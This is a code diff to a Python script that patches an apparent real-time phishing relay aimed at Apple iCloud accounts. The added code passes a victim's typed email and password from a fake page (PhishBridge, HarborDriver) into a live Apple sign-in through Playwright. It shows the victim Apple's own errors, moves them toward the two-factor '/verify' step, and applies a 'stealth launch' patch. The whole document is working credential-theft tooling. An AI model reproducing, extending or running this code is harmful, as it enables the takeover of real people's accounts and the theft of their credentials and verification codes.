@@ -16,7 +16,9 @@ FORWARD_EMAIL_NEW = '''def forward_email(apple: Page, frame, email: str) -> bool
         if not frame:
             return False
     try:
-        ok, _frame = drive_email(apple, frame, email, find_apple_frame)
+        ok, _frame = drive_email(
+            apple, frame, email, find_apple_frame, open_icloud_sign_in
+        )
         return ok
     except PlaywrightError as e:
         print('  [fwd] email ERR', repr(e), flush=True)
@@ -73,6 +75,7 @@ FORWARD_PASSWORD_NEW = '''def forward_password(apple: Page, frame, password: str
             email or '',
             find_apple_frame,
             password_submit_ok=_apple_password_submit_ok,
+            open_signin=open_icloud_sign_in,
         )
         return ok
     except PlaywrightError as e:
@@ -129,6 +132,141 @@ def replace_function(text: str, name: str, new_body: str) -> str:
     return text[:start] + new_body + text[nxt + 1 :]
 
 
+def patch_password_submit(text: str) -> str:
+    if "victim submit -> forward_password" in text:
+        return text
+    drop = (
+        "                            victim_begin_signin_loading(victim, remote=args.remote)\n"
+        "                            victim_signin_loading_until = time.time() + 90.0\n"
+        "                            apple_input_cache.pop('#password_text_field', None)\n"
+    )
+    if drop in text:
+        text = text.replace(drop, "", 1)
+    old_fwd = """                            push_victim_email_to_apple(
+                                apple,
+                                frame,
+                                victim_email_state,
+                                apple_email_live,
+                                force=True,
+                                sync_cache=apple_input_cache,
+                            )
+                            frame = find_apple_frame(apple, frame)
+                            if em and _apple_account_email(frame).lower() != em.lower():
+                                forward_email(apple, frame, em)
+                                frame = find_apple_frame(apple, frame)
+                            push_victim_password_to_apple(
+                                apple,
+                                frame,
+                                victim_password_state,
+                                apple_password_live,
+                                force=True,
+                            )
+                            frame = find_apple_frame(apple, frame)
+                            if forward_password(
+                                apple,
+                                frame,
+                                pwd_send,
+                                em or credentials.get('email') or account,
+                            ):
+                                frame = find_apple_frame(apple, frame)
+                                pending_verify_until = time.time() + 35.0
+                                mirror_loading_until = time.time() + 35.0
+                                victim_signin_loading_until = 0.0
+                                awaiting_apple_path = '/verify'
+                                victim_set_verify(victim, credentials.get('email') or '')
+                                if args.remote and hasattr(victim, 'push_harbor_state'):
+                                    victim_clear_signin_loading(
+                                        victim,
+                                        remote=True,
+                                        extra={'mirrorLoading': True},
+                                    )
+                                elif not args.remote:
+                                    victim_eval(
+                                        victim,
+                                        \"\"\"() => {
+                                          if (window.PhishBridge) window.PhishBridge.setLoading(false);
+                                          if (window.HarborDriver) window.HarborDriver.setMirrorLoading(true);
+                                        }\"\"\",
+                                    )
+                            else:
+                                frame = find_apple_frame(apple, frame)
+                                victim_signin_loading_until = 0.0
+                                victim_clear_signin_loading(victim, remote=args.remote)
+                                victim_eval(
+                                    victim,
+                                    \"\"\"() => {
+                                      if (window.HarborDriver && window.HarborDriver.showSignInError) {
+                                        window.HarborDriver.showSignInError(
+                                          'Password could not be sent to Apple. Complete email on iCloud first, then try again.',
+                                          'password'
+                                        );
+                                      }
+                                    }\"\"\",
+                                )"""
+    new_fwd = """                            print(
+                                f'  [fwd] victim submit -> forward_password ({len(pwd_send)} chars)',
+                                flush=True,
+                            )
+                            frame = ensure_apple_signin_frame(apple, find_apple_frame(apple, frame))
+                            pwd_ok = False
+                            try:
+                                pwd_ok = forward_password(
+                                    apple,
+                                    frame,
+                                    pwd_send,
+                                    em or credentials.get('email') or account,
+                                )
+                            finally:
+                                victim_signin_loading_until = 0.0
+                                victim_clear_signin_loading(victim, remote=args.remote)
+                            if pwd_ok:
+                                frame = find_apple_frame(apple, frame)
+                                pending_verify_until = time.time() + 35.0
+                                mirror_loading_until = time.time() + 35.0
+                                awaiting_apple_path = '/verify'
+                                victim_set_verify(victim, credentials.get('email') or '')
+                                if args.remote and hasattr(victim, 'push_harbor_state'):
+                                    victim.push_harbor_state(
+                                        {'mirrorLoading': True, 'clearSigninLoading': True}
+                                    )
+                                elif not args.remote:
+                                    victim_eval(
+                                        victim,
+                                        \"\"\"() => {
+                                          if (window.PhishBridge) window.PhishBridge.setLoading(false);
+                                          if (window.HarborDriver) window.HarborDriver.setMirrorLoading(true);
+                                        }\"\"\",
+                                    )
+                            else:
+                                victim_push_signin_error(
+                                    victim,
+                                    'Could not send password to Apple. Check the iCloud window, then try again.',
+                                    'password',
+                                    remote=args.remote,
+                                )"""
+    if old_fwd in text:
+        text = text.replace(old_fwd, new_fwd, 1)
+    old_clear = "    payload: dict = {'clearSigninLoading': True}\n"
+    new_clear = "    payload: dict = {'clearSigninLoading': True, 'signinLoading': False}\n"
+    if old_clear in text and new_clear not in text:
+        text = text.replace(old_clear, new_clear, 1)
+    old_push_pw = """    _apple_force_password_field(frame, value)
+    live_sync.mark_pushed(value)"""
+    new_push_pw = """    try:
+        from apple_drive import password_entry_ready, read_account_email, type_password
+
+        em = read_account_email(frame)
+        if not password_entry_ready(frame, em):
+            return
+        type_password(frame, value or '')
+    except ImportError:
+        _apple_force_password_field(frame, value)
+    live_sync.mark_pushed(value)"""
+    if old_push_pw in text and "type_password(frame, value" not in text:
+        text = text.replace(old_push_pw, new_push_pw, 1)
+    return text
+
+
 def patch_remote_calm(text: str) -> str:
     old_push = """                push_victim_email_to_apple(
                     apple, frame, victim_email_state, apple_email_live,
@@ -167,6 +305,52 @@ def patch_remote_calm(text: str) -> str:
     if old_end in text and "pending_email_account and not args.remote" not in text:
         text = text.replace(old_end, new_end, 1)
 
+    old_ui = """                    elif time.time() < victim_signin_loading_until:
+                        ui_state['signinLoading'] = True
+                    if route_sync.operator_path() == '/verify'"""
+    new_ui = """                    elif time.time() < victim_signin_loading_until:
+                        ui_state['signinLoading'] = True
+                    else:
+                        ui_state['clearSigninLoading'] = True
+                        ui_state['signinLoading'] = False
+                    if route_sync.operator_path() == '/verify'"""
+    if old_ui in text and "else:\n                        ui_state['clearSigninLoading']" not in text:
+        text = text.replace(old_ui, new_ui, 1)
+
+    old_pw_commit = """                            push_victim_password_to_apple(
+                                apple,
+                                frame,
+                                victim_password_state,
+                                apple_password_live,
+                                force=True,
+                            )
+                            frame = find_apple_frame(apple, frame)
+                        continue"""
+    new_pw_commit = """                        continue"""
+    if old_pw_commit in text:
+        text = text.replace(old_pw_commit, new_pw_commit, 1)
+
+    old_spin = """                    elif time.time() < victim_signin_loading_until:
+                        ui_state['signinLoading'] = True
+                    else:
+                        ui_state['clearSigninLoading'] = True
+                        ui_state['signinLoading'] = False
+                    if route_sync.operator_path() == '/verify'"""
+    new_spin = """                    elif (
+                        time.time() < victim_signin_loading_until
+                        and not (on_signin and pw_on_apple and victim_password_ui_applied)
+                    ):
+                        ui_state['signinLoading'] = True
+                    else:
+                        ui_state['clearSigninLoading'] = True
+                        ui_state['signinLoading'] = False
+                    if route_sync.operator_path() == '/verify'"""
+    if (
+        "on_signin and pw_on_apple and victim_password_ui_applied" not in text
+        and old_spin in text
+    ):
+        text = text.replace(old_spin, new_spin, 1)
+
     return text
 
 
@@ -203,6 +387,7 @@ def main() -> None:
     text = replace_function(text, "apple_auth_frame", APPLE_AUTH_FRAME_NEW)
     text = replace_function(text, "apple_password_step_ready", APPLE_PW_READY_NEW)
     text = patch_remote_calm(text)
+    text = patch_password_submit(text)
     text = patch_stealth_launch(text)
     if "from apple_drive import drive_email" not in text:
         raise SystemExit("forward_email patch failed")
